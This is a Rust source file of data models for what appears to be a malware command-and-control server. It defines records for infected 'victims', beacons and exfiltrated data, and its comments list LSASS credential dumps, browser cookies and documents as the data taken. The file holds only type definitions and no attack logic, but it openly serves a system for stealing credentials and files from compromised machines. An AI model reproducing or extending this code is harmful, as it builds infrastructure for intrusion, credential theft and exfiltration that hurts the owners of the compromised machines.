#![allow(unused_imports)]
#![allow(dead_code)]

use serde::{Deserialize, Serialize};
use chrono::{DateTime, Utc};
use uuid::Uuid;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExfilData {
    pub victim_id: String,
    pub machine_name: String,
    pub username: String,
    pub ip_address: String,
    pub data_type: String,  // "lsass_dump", "browser_cookies", "documents"
    pub data: String,       // Base64 encoded encrypted data
    pub timestamp: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Victim {
    pub id: String,
    pub machine_name: String,
    pub username: String,
    pub ip_address: String,
    pub first_seen: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    pub os_version: String,
    pub total_exfils: i32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Beacon {
    pub victim_id: String,
    pub timestamp: DateTime<Utc>,
    pub status: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ExfilResponse {
    pub id: String,
    pub status: String,
    pub message: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ApiResponse<T> {
    pub success: bool,
    pub data: Option<T>,
    pub error: Option<String>,
}